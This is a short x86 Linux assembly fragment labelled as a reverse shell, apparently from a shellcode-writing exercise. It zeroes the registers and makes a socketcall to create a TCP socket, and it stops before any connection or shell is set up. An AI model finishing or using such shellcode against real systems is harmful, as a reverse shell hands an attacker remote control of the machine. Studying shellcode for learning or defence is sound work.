;Rev shell

global _start

section .text
_start:

;zeroing reg's

xor eax, eax
xor ebx, ebx
xor ecx, ecx
xor edx, edx

;creating a socket
mov al, 0x66	; syscall 102 hex => 0x66
mov bl, 0x1	; sys_socket 1
push ecx	; 0 for IPPROTO
push ebx	; 1 for sock_stream
push 0x2	; 2 for af_inet | pf_inet
mov ecx, esp	; ecx points to top of stack
int 0x80


